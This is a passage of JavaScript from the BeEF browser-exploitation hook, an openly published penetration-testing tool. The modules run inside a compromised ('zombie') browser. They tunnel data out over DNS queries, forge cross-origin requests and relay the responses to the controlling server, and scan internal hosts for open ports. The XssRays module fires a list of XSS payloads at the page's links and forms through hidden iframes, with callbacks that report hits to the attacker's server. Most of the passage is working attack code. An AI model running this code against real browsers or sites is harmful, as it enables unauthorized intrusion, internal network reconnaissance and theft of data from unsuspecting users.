        //see extensions/dns/dns.rb, useful to explicitly mark the DNS request as a tunnel request

        beef.debug(segments.length);

        for (var seq = 1; seq <= segments.length; seq++) {
            sendQuery(ident + msgId + "." + seq + "." + segments.length + "." + segments[seq - 1] + "." + domain);
        }

        // callback - returns the number of queries sent
        if (!!callback)
            callback(segments.length);

    }

};

beef.regCmp('beef.net.dns');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// beef.net.connection - wraps Mozilla's Network Information API
// https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation
// https://developer.mozilla.org/en-US/docs/Web/API/Navigator/connection
beef.net.connection = {

    /* Returns the connection type
   * @example: beef.net.connection.type()
   * @note: https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation/type
   * @return: {String} connection type or 'unknown'.
   **/
    type: function() {
        try {
            var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            var type = connection.type;
            if (/^[a-z]+$/.test(type))
                return type;
            else
                return 'unknown';
        } catch (e) {
            beef.debug("Error retrieving connection type: " + e.message);
            return 'unknown';
        }
    },

    /* Returns the maximum downlink speed of the connection
   * @example: beef.net.connection.downlinkMax()
   * @note: https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation/downlinkMax
   * @return: {String} downlink max or 'unknown'.
   **/
    downlinkMax: function() {
        try {
            var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            var max = connection.downlinkMax;
            if (max)
                return max;
            else
                return 'unknown';
        } catch (e) {
            beef.debug("Error retrieving connection downlink max: " + e.message);
            return 'unknown';
        }
    }

};

beef.regCmp('beef.net.connection');

beef.net.cors = {

    handler: "cors",

    /**
     * Response Object - used in the beef.net.request callback
     */
    response: function() {
        this.status = null;
        // 500, 404, 200, 302, etc
        this.headers = null;
        // full response headers
        this.body = null;
        // full response body
    },

    /**
     * Make a cross-origin request using CORS
     *
     * @param method {String} HTTP verb ('GET', 'POST', 'DELETE', etc.)
     * @param url {String} url
     * @param data {String} request body
     * @param timeout {Integer} request timeout in milliseconds
     * @param callback {Function} function to callback on completion
     */
    request: function(method, url, data, timeout, callback) {

        var xhr;
        var response = new this.response;

        if (XMLHttpRequest) {
            xhr = new XMLHttpRequest();

            if ('withCredentials'in xhr) {
                xhr.open(method, url, true);
                xhr.timeout = parseInt(timeout, 10);
                xhr.onerror = function() {}
                ;
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        response.headers = this.getAllResponseHeaders()
                        response.body = this.responseText;
                        response.status = this.status;
                        if (!!callback) {
                            if (!!response) {
                                callback(response);
                            } else {
                                callback('ERROR: No Response. CORS requests may be denied for this resource.')
                            }
                        }
                    }
                }
                ;
                xhr.send(data);
            }
        } else if (typeof XDomainRequest != "undefined") {
            xhr = new XDomainRequest();
            xhr.open(method, url);
            xhr.onerror = function() {}
            ;
            xhr.onload = function() {
                response.headers = this.getAllResponseHeaders()
                response.body = this.responseText;
                response.status = this.status;
                if (!!callback) {
                    if (!!response) {
                        callback(response);
                    } else {
                        callback('ERROR: No Response. CORS requests may be denied for this resource.')
                    }
                }
            }
            ;
            xhr.send(data);
        } else {
            if (!!callback)
                callback('ERROR: Not Supported. CORS is not supported by the browser. The request was not sent.');
        }

    }

};

beef.regCmp('beef.net.cors');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net.requester
 * 
 * request object structure:
 * + method: {String} HTTP method to use (GET or POST).
 * + host: {String} hostname
 * + query_string: {String} The query string is a part of the URL which is passed to the program.
 * + uri: {String} The URI syntax consists of a URI scheme name.
 * + headers: {Array} contain the operating parameters of the HTTP request. 
 */
beef.net.requester = {

    handler: "requester",

    send: function(requests_array) {
        for (var i = 0; i < requests_array.length; i++) {
            request = requests_array[i];
            if (request.proto == 'https')
                var scheme = 'https';
            else
                var scheme = 'http';
            beef.debug('[Requester] ' + request.method + ' ' + scheme + '://' + request.host + ':' + request.port + request.uri + ' - Data: ' + request.data);
            beef.net.forge_request(scheme, request.method, request.host, request.port, request.uri, null, request.headers, request.data, 10, null, request.allowCrossDomain, request.id, function(res, requestid) {
                beef.net.send('/requester', requestid, {
                    response_data: res.response_body,
                    response_status_code: res.status_code,
                    response_status_text: res.status_text,
                    response_port_status: res.port_status,
                    response_headers: res.headers
                });
            });
        }
    }
};

beef.regCmp('beef.net.requester');

/*
 * XSS Rays
 * Legal bit:
 * Do not remove this notice.
 * Copyright (c) 2009 by Gareth Heyes
 * Programmed for Microsoft
 * gareth --at-- businessinfo -dot- co |dot| uk
 * Version 0.5.5
 *
 * This license governs use of the accompanying software. If you use the software, you
 * accept this license. If you do not accept the license, do not use the software.
 * 1. Definitions
 * The terms "reproduce," "reproduction," "derivative works," and "distribution" have the
 * same meaning here as under U.S. copyright law.
 * A "contribution" is the original software, or any additions or changes to the software.
 * A "contributor" is any person that distributes its contribution under this license.
 * "Licensed patents" are a contributor's patent claims that read directly on its contribution.
 * 2. Grant of Rights
 * (A) Copyright Grant- Subject to the terms of this license, including the license conditions and limitations in section 3, each contributor grants you a non-exclusive, worldwide, royalty-free copyright license to reproduce its contribution, prepare derivative works of its contribution, and distribute its contribution or any derivative works that you create.
 * (B) Patent Grant- Subject to the terms of this license, including the license conditions and limitations in section 3, each contributor grants you a non-exclusive, worldwide, royalty-free license under its licensed patents to make, have made, use, sell, offer for sale, import, and/or otherwise dispose of its contribution in the software or derivative works of the contribution in the software.
 * 3. Conditions and Limitations
 * (A) No Trademark License- This license does not grant you rights to use any contributors' name, logo, or trademarks.
 * (B) If you bring a patent claim against any contributor over patents that you claim are infringed by the software, your patent license from such contributor to the software ends automatically.
 * (C) If you distribute any portion of the software, you must retain all copyright, patent, trademark, and attribution notices that are present in the software.
 * (D) If you distribute any portion of the software in source code form, you may do so only under this license by including a complete copy of this license with your distribution. If you distribute any portion of the software in compiled or object code form, you may only do so under a license that complies with this license.
 * (E) The software is licensed "as-is." You bear the risk of using it. The contributors give no express warranties, guarantees or conditions. You may have additional consumer rights under your local laws which this license cannot change. To the extent permitted under your local laws, the contributors exclude the implied warranties of merchantability, fitness for a particular purpose and non-infringement.
 */

/*
 * XssRays 0.5.5 ported to BeEF by Michele "antisnatchor" Orru'
 * The XSS detection mechanisms has been rewritten from scratch: instead of using the location hash trick (that doesn't work anymore),
 * if the vulnerability is triggered the JS code vector will contact back BeEF.
 * Other aspects of the original code have been simplified and improved.
 */
beef.net.xssrays = {
    handler: "xssrays",
    completed: 0,
    totalConnections: 0,

    // BeEF variables
    xssraysScanId: 0,
    hookedBrowserSession: "",
    beefRayUrl: "",
    // the following variables are overridden via BeEF, in the Scan Config XssRays sub-tab. 
    crossDomain: false,
    cleanUpTimeout: 5000,

    //browser-specific attack vectors available strings: ALL, FF, IE, S, C, O
    vectors: [
    {
        input: "\',XSS,\'",
        name: 'Standard DOM based injection single quote',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: '",XSS,"',
        name: 'Standard DOM based injection double quote',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: '\'"><script>XSS<\/script>',
        name: 'Standard script injection',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: '\'"><body onload="XSS">',
        name: 'body onload',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: '%27%3E%3C%73%63%72%69%70%74%3EXSS%3C%2F%73%63%72%69%70%74%3E',
        name: 'url encoded single quote',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: '%22%3E%3C%73%63%72%69%70%74%3EXSS%3C%2F%73%63%72%69%70%74%3E',
        name: 'url encoded double quote',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: '%25%32%37%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45XSS%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45',
        name: 'double url encoded single quote',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: '%25%32%32%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45XSS%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45',
        name: 'double url encoded double quote',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: '%%32%35%%33%32%%33%32%%32%35%%33%33%%34%35%%32%35%%33%33%%34%33%%32%35%%33%37%%33%33%%32%35%%33%36%%33%33%%32%35%%33%37%%33%32%%32%35%%33%36%%33%39%%32%35%%33%37%%33%30%%32%35%%33%37%%33%34%%32%35%%33%33%%34%35XSS%%32%35%%33%33%%34%33%%32%35%%33%32%%34%36%%32%35%%33%37%%33%33%%32%35%%33%36%%33%33%%32%35%%33%37%%33%32%%32%35%%33%36%%33%39%%32%35%%33%37%%33%30%%32%35%%33%37%%33%34%%32%35%%33%33%%34%35',
        name: 'double nibble url encoded double quote',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: "' style=abc:expression(XSS) ' \" style=abc:expression(XSS) \"",
        name: 'Expression CSS based injection',
        browser: 'IE',
        url: true,
        form: true,
        path: true
    }, {
        input: '" type=image src=null onerror=XSS " \' type=image src=null onerror=XSS \'',
        name: 'Image input overwrite based injection',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: "' onload='XSS' \" onload=\"XSS\"/onload=\"XSS\"/onload='XSS'/",
        name: 'onload event injection',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: '\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=XSS>',
        name: 'Image injection HTML breaker',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: "'},XSS,function x(){//",
        name: 'DOM based function breaker single quote',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: '"},XSS,function x(){//',
        name: 'DOM based function breaker double quote',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: '\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3eXSS\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e',
        name: 'DOM based innerHTML injection',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: 'javascript:XSS',
        name: 'Javascript protocol injection',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: 'null,XSS//',
        name: 'Unfiltered DOM injection comma',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }, {
        input: 'null\nXSS//',
        name: 'Unfiltered DOM injection new line',
        browser: 'ALL',
        url: true,
        form: true,
        path: true
    }],
    uniqueID: 0,
    rays: [],
    stack: [],

    // return true is the attack vector can be launched to the current browser type.
    checkBrowser: function(vector_array_index) {
        var result = false;
        var browser_id = this.vectors[vector_array_index].browser;
        switch (browser_id) {
        case "ALL":
            result = true;
            break;
        case "FF":
            if (beef.browser.isFF())
                result = true;
            break;
        case "IE":
            if (beef.browser.isIE())
                result = true;
            break;
        case "C":
            if (beef.browser.isC())
                result = true;
            break;
        case "S":
            if (beef.browser.isS())
                result = true;
            break;
        case "O":
            if (beef.browser.isO())
                result = true;
            break;
        default:
            result = false;
        }
        beef.debug("==== browser_id ==== [" + browser_id + "], result [" + result + "]");
        return result;
    },

    // main function, where all starts :-)
    startScan: function(xssraysScanId, hookedBrowserSession, beefUrl, crossDomain, timeout) {

        this.xssraysScanId = xssraysScanId;
        this.hookedBrowserSession = hookedBrowserSession;
        this.beefRayUrl = beefUrl + '/' + this.handler;
        beef.debug("Using [" + this.beefRayUrl + "] handler to contact back BeEF");
        this.crossDomain = crossDomain;
        this.cleanUpTimeout = timeout;

        this.scan();
        beef.debug("Starting scan");
        this.runJobs();
    },
    complete: function() {
        if (beef.net.xssrays.completed == beef.net.xssrays.totalConnections) {
            beef.debug("COMPLETE, notifying BeEF for scan id [" + beef.net.xssrays.xssraysScanId + "]");
            $j.get(this.beefRayUrl, {
                hbsess: this.hookedBrowserSession,
                raysid: this.xssraysScanId,
                action: "finish"
            });
        } else {
            this.getNextJob();
        }
    },
    getNextJob: function() {
        var that = this;
        beef.debug("getNextJob - this.stack.length [" + this.stack.length + "]");
        if (this.stack.length > 0) {
            var func = that.stack.shift();
            if (func) {
                that.completed++;
                func.call(that);
            }
        } else {
            //nothing else to scan
            this.complete();
        }
    },
    scan: function() {
        this.scanLinks();
        this.scanForms();
    },
    scanPaths: function() {
        this.xss({
            type: 'path'
        });
        return this;
    },
    scanForms: function() {
        this.xss({
            type: 'form'
        });
        return this;
    },
    scanLinks: function() {
        //TODO: add depth crawling for links that are in the same domain
        beef.debug("scanLinks, document.links.length [" + document.links.length + "]");
        for (var i = 0; i < document.links.length; i++) {
            var url = document.links[i];

            if ((url.hostname.toString() === location.hostname.toString() || this.crossDomain) && (location.protocol === 'http:' || location.protocol === 'https:')) {
                beef.debug("Starting scanning URL [" + url + "]\n url.href => " + url.href + "\n url.pathname => " + url.pathname + "\n" + "url.search => " + url.search + "\n");
                this.xss({
                    href: url.href,
                    pathname: url.pathname,
                    hostname: url.hostname,
                    port: url.port,
                    protocol: location.protocol,
                    search: url.search,
                    type: 'url'
                });
                //scan each link & param
            } else {
                beef.debug('Scan is not Cross-domain.  URLS\nurl :' + url.hostname.toString());
                beef.debug('\nlocation :' + location.hostname.toString());
            }
        }
        if (location.search.length > 0) {
            this.xss({
                pathname: location.pathname,
                hostname: url.hostname,
                port: url.port,
                protocol: location.protocol,
                search: location.search,
                type: 'url'
            });
            //scan originating url
        }
        return this;
    },
    xss: function(target) {
        switch (target.type) {
        case "url":
            if (target.search.length > 0) {
                target.search = target.search.slice(1);
                target.search = target.search.split(/&|&amp;/);

                if (beef.browser.isIE() && target.pathname.charAt(0) != "/") {
                    //the damn IE doesn't contain the forward slash in pathname
                    var pathname = "/" + target.pathname;
                } else {
                    var pathname = target.pathname;
                }

                var params = {};
                for (var i = 0; i < target.search.length; i++) {
                    target.search[i] = target.search[i].split('=');
                    params[target.search[i][0]] = target.search[i][1];
                }
                for (var i = 0; i < this.vectors.length; i++) {
                    // skip the current vector if it's not compatible with the hooked browser
                    if (!this.checkBrowser(i)) {
                        beef.debug("Skipping vector [" + this.vectors[i].name + "] because it's not compatible with the current browser.");
                        continue;
                    }
                    if (!this.vectors[i].url) {
                        continue;
                    }
                    if (this.vectors[i].url) {
                        if (target.port == null || target.port == "") {
                            beef.debug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
                            this.run(target.protocol + '//' + target.hostname + pathname, 'GET', this.vectors[i], params, true);
                            //params
                        } else {
                            beef.debug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
                            this.run(target.protocol + '//' + target.hostname + ':' + target.port + pathname, 'GET', this.vectors[i], params, true);
                            //params
                        }
                    }
                    if (this.vectors[i].path) {
                        if (target.port == null || target.port == "") {
                            beef.debug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
                            this.run(target.protocol + '//' + target.hostname + pathname, 'GET', this.vectors[i], null, true);
                            //paths
                        } else {
                            beef.debug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
                            this.run(target.protocol + '//' + target.hostname + ':' + target.port + pathname, 'GET', this.vectors[i], null, true);
                            //paths
                        }
                    }
                }
            }
            break;
        case "form":
            var params = {};
            var paramsstring = "";
            for (var i = 0; i < document.forms.length; i++) {
                var action = document.forms[i].action || document.location;
                var method = document.forms[i].method.toUpperCase() === 'POST' ? 'POST' : 'GET';

                for (var j = 0; j < document.forms[i].elements.length; j++) {
                    params[document.forms[i].elements[j].name] = document.forms[i].elements[j].value || 1;
                }
                for (var k = 0; k < this.vectors.length; k++) {

                    // skip the current vector if it's not compatible with the hooked browser
                    if (!this.checkBrowser(k)) {
                        beef.debug("Skipping vector [" + this.vectors[i].name + "] because it's not compatible with the current browser.");
                        continue;
                    }
                    if (!this.vectors[k].form) {
                        continue;
                    }
                    if (!this.crossDomain && (this.host(action).toString() != this.host(location.toString()))) {
                        beef.debug('Scan is not Cross-domain. FormPost\naction :' + this.host(action).toString());
                        beef.debug('location :' + this.host(location));
                        continue;
                    }
                    if (this.vectors[k].form) {
                        if (method === 'GET') {
                            beef.debug("Starting XSS on FORM action params, GET method of [" + action + "], params [" + paramsstring + "]");
                            this.run(action, method, this.vectors[k], params, true);
                            //params
                        } else {
                            beef.debug("Starting XSS on FORM action params, POST method of [" + action + "], params [" + paramsstring + "]");
                            this.run(action, method, this.vectors[k], params, false);
                            //params
                        }
                    }
                    if (this.vectors[k].path) {
                        beef.debug("Starting XSS on FORM action URI PATH of [" + action + "], ");
                        this.run(action, 'GET', this.vectors[k], null, true);
                        //paths
                    }
                }
            }
            break;
        }
    },
    host: function(url) {
        var host = url;
        host = /^https?:[\/]{2}[^\/]+/.test(url.toString()) ? url.toString().match(/^https?:[\/]{2}[^\/]+/) : /(?:^[^a-zA-Z0-9\/]|^[a-zA-Z0-9]+[:]+)/.test(url.toString()) ? '' : location.hostname.toString();
        return host;
    },
    fileName: function(url) {
        return url.match(/(?:^[^\/]|^https?:[\/]{2}|^[\/]+)[^?]+/) || '';
    },

    urlEncode: function(str) {
        str = str.toString();
        str = str.replace(/"/g, '%22');
        str = str.replace(/&/g, '%26');
        str = str.replace(/\+/g, '%2b');
        return str;
    },

    // this is the main core function with the detection mechanisms...
    run: function(url, method, vector, params, urlencode) {
        this.stack.push(function() {

            //check if the URL end with / . In this case remove the last /, as it will be added later.
            // this check is needed only when checking for URI path injections
            if (url[url.length - 1] == "/" && params == null) {
                url = url.substring(0, url.length - 2);
                beef.debug("Remove last / from url. New url [" + url + "]");
            }

            beef.net.xssrays.uniqueID++;
            beef.debug('Processing vector [' + vector.name + "], URL [" + url + "]");
            var poc = '';
            var pocurl = url;
            var exploit = '';
            var action = url;

            beef.net.xssrays.rays[beef.net.xssrays.uniqueID] = {
                vector: vector,
                url: url,
                params: params
            };
            var ray = this.rays[beef.net.xssrays.uniqueID];

            var paramsPos = 0;
            if (params != null) {
                /*
                 * ++++++++++ check for XSS in URI parameters (GET) ++++++++++
                 */
                for (var i in params) {
                    if (params.hasOwnProperty(i)) {

                        if (!/[?]/.test(url)) {
                            url += '?';
                            pocurl += '?';
                        }

                        poc = vector.input.replace(/XSS/g, "alert(1)");
                        pocurl += i + '=' + (urlencode ? encodeURIComponent(poc) : poc) + '&';

                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;

                        beefCallback = "location='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";

                        exploit = vector.input.replace(/XSS/g, beefCallback);

                        if (beef.browser.isC() || beef.browser.isS()) {
                            //we will base64 the whole uri later
                            url += i + '=' + exploit + '&';
                        } else {
                            url += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
                        }

                        paramsPos++;
                    }
                }
            } else {
                /*
                 * ++++++++++ check for XSS in URI path (GET) ++++++++++
                 */
                var filename = beef.net.xssrays.fileName(url);

                poc = vector.input.replace(/XSS/g, "alert(1)");
                pocurl = poc.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');

                beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;

                beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";

                exploit = vector.input.replace(/XSS/g, beefCallback);

                //TODO: if the url is something like example.com/?param=1 then a second slash will be added, like example.com//<xss>.
                //TODO: this need to checked and the slash shouldn't be added in this particular case
                url = url.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
            }
            /*
             * ++++++++++ create the iFrame that will contain the attack vector ++++++++++
             */
            if (beef.browser.isIE()) {
                try {
                    var iframe = document.createElement('<iframe name="ray' + Math.random().toString() + '">');
                } catch (e) {
                    var iframe = document.createElement('iframe');
                    iframe.name = 'ray' + Math.random().toString();
                }
            } else {
                var iframe = document.createElement('iframe');
                iframe.name = 'ray' + Math.random().toString();
            }
            iframe.style.display = 'none';
            iframe.id = 'ray' + beef.net.xssrays.uniqueID;
            iframe.time = beef.net.xssrays.timestamp();

            if (method === 'GET') {
                if (beef.browser.isC() || beef.browser.isS()) {
                    var datauri = btoa(url);
                    iframe.src = "data:text/html;base64," + datauri;
                } else {
                    iframe.src = url;
                }
                document.body.appendChild(iframe);
                beef.debug("Creating XSS iFrame with src [" + iframe.src + "], id[" + iframe.id + "], time [" + iframe.time + "]");
            } else if (method === 'POST') {
                /*
                 * ++++++++++ check for XSS in body parameters (POST) ++++++++++
                 */
                var form = '<form action="' + beef.net.xssrays.escape(action) + '" method="post" id="frm">';
                poc = '';
                pocurl = action + "?";
                paramsPos = 0;

                beef.debug("Form action [" + action + "]");
                for (var i in params) {
                    if (params.hasOwnProperty(i)) {

                        poc = vector.input.replace(/XSS/g, "alert(1)");
                        poc = poc.replace(/<\/script>/g, "<\/scr\"+\"ipt>");
                        pocurl += i + '=' + (urlencode ? encodeURIComponent(poc) : poc);
                        // + '&';

                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;

                        beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";

                        exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, beefCallback));
                        form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
                        beef.debug("form param[" + i + "] = " + params[i].toString());

                        paramsPos++;
                    }
                }
                form += '<\/form>';
                document.body.appendChild(iframe);
                beef.debug("Creating form [" + form + "]");
                iframe.contentWindow.document.writeln(form);
                iframe.contentWindow.document.writeln('<script>document.createElement("form").submit.apply(document.forms[0]);<\/script>');
                beef.debug("Submitting form");
            }

        });
    },

    // run the jobs (run functions added to the stack), and clean the shit (iframes) from the DOM after a timeout value
    runJobs: function() {
        var that = this;
        this.totalConnections = this.stack.length;
        that.getNextJob();
        setInterval(function() {
            var numOfConnections = 0;
            for (var i = 0; i < document.getElementsByTagName('iframe').length; i++) {
                var iframe = document.getElementsByTagName('iframe')[i];
                numOfConnections++;
                //beef.debug("runJobs parseInt(this.timestamp()) [" + parseInt(beef.net.xssrays.timestamp()) + "], parseInt(iframe.time) [" + parseInt(iframe.time) + "]");
                if (parseInt(beef.net.xssrays.timestamp()) - parseInt(iframe.time) > 5) {
                    try {
                        if (iframe) {
                            beef.net.xssrays.complete();
                            beef.debug("RunJobs cleaning up iFrame [" + iframe.id + "]");
                            document.body.removeChild(iframe);
                        }
                    } catch (e) {
                        beef.debug("Exception [" + e.toString() + "] when cleaning iframes.")
                    }
                }
            }

            if (numOfConnections == 0) {
                clearTimeout(this);
            }

        }, this.cleanUpTimeout);

        return this;
    },
    timestamp: function() {
        return parseInt(new Date().getTime().toString().substring(0, 10));
    },
    escape: function(str) {
        str = str.toString();
        str = str.replace(/</g, '&lt;');
        str = str.replace(/>/g, '&gt;');
        str = str.replace(/\u0022/g, '&quot;');
        str = str.replace(/\u0027/g, '&#39;');
        str = str.replace(/\\/g, '&#92;');
        return str;
    }

};

beef.regCmp('beef.net.xssrays');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net.portscanner
 * 
 * Provides port scanning functions for the zombie. A mod of pdp's scanner
 * 
 * Version: '0.1',
 * author: 'Petko Petkov',
 * homepage: 'http://www.gnucitizen.org'
 */

beef.net.portscanner = {

    scanPort: function(callback, target, port, timeout) {
        var timeout = (timeout == null) ? 100 : timeout;
        var img = new Image();

        img.onerror = function() {
            if (!img)
                return;
            img = undefined;
            callback(target, port, 'open');
        }
        ;

        img.onload = img.onerror;

        img.src = 'http://' + target + ':' + port;

        setTimeout(function() {
            if (!img)
                return;
            img = undefined;
            callback(target, port, 'closed');
        }, timeout);

    },

    scanTarget: function(callback, target, ports_str, timeout) {
        var ports = ports_str.split(",");

        for (index = 0; index < ports.length; index++) {
            this.scanPort(callback, target, ports[index], timeout);
        }
        ;

    }
};

beef.regCmp('beef.net.portscanner');

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.are = {
    status_success: function() {
        return 1;
    },
    status_unknown: function() {
        return 0;
    },
    status_error: function() {
        return -1;
    }
};
beef.regCmp("beef.are");

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
 Sometimes there are timing issues and looks like beef_init
 is not called at all (always in cross-origin situations,
 for example calling the hook with jquery getScript,
 or sometimes with event handler injections).

 To fix this, we call again beef_init after 1 second.
 Cheers to John Wilander that discussed this bug with me at OWASP AppSec Research Greece
 antisnatchor
 */
setTimeout(beef_init, 1000);
